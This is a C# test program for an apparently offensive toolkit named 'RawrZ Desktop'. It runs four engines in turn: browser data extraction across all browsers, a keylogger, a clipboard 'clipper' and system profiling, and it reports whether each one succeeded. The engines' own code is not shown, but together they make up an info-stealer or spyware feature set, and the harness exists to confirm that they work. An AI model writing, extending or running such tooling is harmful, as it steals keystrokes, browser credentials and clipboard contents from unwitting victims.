using System;
using System.Collections.Generic;
using System.Threading.Tasks;
using RawrZDesktop.Engines;

namespace RawrZDesktop.Tests
{
    public class ExtractionFeatureTester
    {
        public static async Task Main(string[] args)
        {
            Console.WriteLine("🔍 Testing RawrZ Desktop Extraction Features");
            Console.WriteLine("=============================================");
            
            var browserEngine = new BrowserDataExtractionEngine();
            var keyloggerEngine = new KeyloggerEngine();
            var clipperEngine = new ClipperEngine();
            var systemProfiler = new SystemProfilingEngine();
            
            // Test Browser Data Extraction
            Console.WriteLine("\n🌐 Testing Browser Data Extraction...");
            await TestBrowserExtraction(browserEngine);
            
            // Test Keylogger Engine
            Console.WriteLine("\n⌨️ Testing Keylogger Engine...");
            await TestKeylogger(keyloggerEngine);
            
            // Test Clipper Engine
            Console.WriteLine("\n📋 Testing Clipper Engine...");
            await TestClipper(clipperEngine);
            
            // Test System Profiling
            Console.WriteLine("\n🖥️ Testing System Profiling...");
            await TestSystemProfiling(systemProfiler);
            
            Console.WriteLine("\n✅ All extraction feature tests completed!");
        }
        
        private static async Task TestBrowserExtraction(BrowserDataExtractionEngine engine)
        {
            try
            {
                var parameters = new Dictionary<string, object>
                {
                    ["operation"] = "extract_all_browsers"
                };
                
                var result = await engine.ExecuteAsync(parameters);
                
                if (result.Success)
                {
                    Console.WriteLine($"✅ Browser extraction successful: {result.Message}");
                    Console.WriteLine($"📊 Data size: {result.DataSize} bytes");
                }
                else
                {
                    Console.WriteLine($"❌ Browser extraction failed: {result.Error}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"❌ Browser extraction error: {ex.Message}");
            }
        }
        
        private static async Task TestKeylogger(KeyloggerEngine engine)
        {
            try
            {
                var parameters = new Dictionary<string, object>
                {
                    ["operation"] = "start_keylogger",
                    ["duration"] = 5 // 5 seconds
                };
                
                var result = await engine.ExecuteAsync(parameters);
                
                if (result.Success)
                {
                    Console.WriteLine($"✅ Keylogger test successful: {result.Message}");
                }
                else
                {
                    Console.WriteLine($"❌ Keylogger test failed: {result.Error}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"❌ Keylogger test error: {ex.Message}");
            }
        }
        
        private static async Task TestClipper(ClipperEngine engine)
        {
            try
            {
                var parameters = new Dictionary<string, object>
                {
                    ["operation"] = "monitor_clipboard",
                    ["duration"] = 3 // 3 seconds
                };
                
                var result = await engine.ExecuteAsync(parameters);
                
                if (result.Success)
                {
                    Console.WriteLine($"✅ Clipper test successful: {result.Message}");
                }
                else
                {
                    Console.WriteLine($"❌ Clipper test failed: {result.Error}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"❌ Clipper test error: {ex.Message}");
            }
        }
        
        private static async Task TestSystemProfiling(SystemProfilingEngine engine)
        {
            try
            {
                var parameters = new Dictionary<string, object>
                {
                    ["operation"] = "profile_system"
                };
                
                var result = await engine.ExecuteAsync(parameters);
                
                if (result.Success)
                {
                    Console.WriteLine($"✅ System profiling successful: {result.Message}");
                    Console.WriteLine($"📊 Profile data size: {result.DataSize} bytes");
                }
                else
                {
                    Console.WriteLine($"❌ System profiling failed: {result.Error}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"❌ System profiling error: {ex.Message}");
            }
        }
    }
}
